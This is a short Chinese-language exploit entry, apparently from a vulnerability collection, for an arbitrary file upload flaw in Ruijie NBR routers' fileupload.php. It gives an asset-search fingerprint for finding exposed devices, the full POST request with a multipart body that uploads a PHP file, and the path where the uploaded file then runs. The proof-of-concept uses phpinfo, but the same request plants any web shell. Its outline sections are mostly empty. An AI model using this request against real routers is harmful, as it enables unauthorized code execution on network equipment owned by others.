# 锐捷NBR路由器fileupload.php任意文件上传漏洞

- **系统**：锐捷　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name=="Ruijie 锐捷 EWEB"`
- **请求**：`POST /ddi/server/fileupload.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Host: xx.xx.xx.xx`　`Content-Length: 219`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="uploadDir"
upload
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.php"
<?php phpinfo();?>
--00content0boundary00--

上传文件位置
https://xx.xx.xx.xx/ddi/server/upload/1.php
```

**其他**
- 锐捷NBR路由器fileupload.php任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 锐捷NBR路由器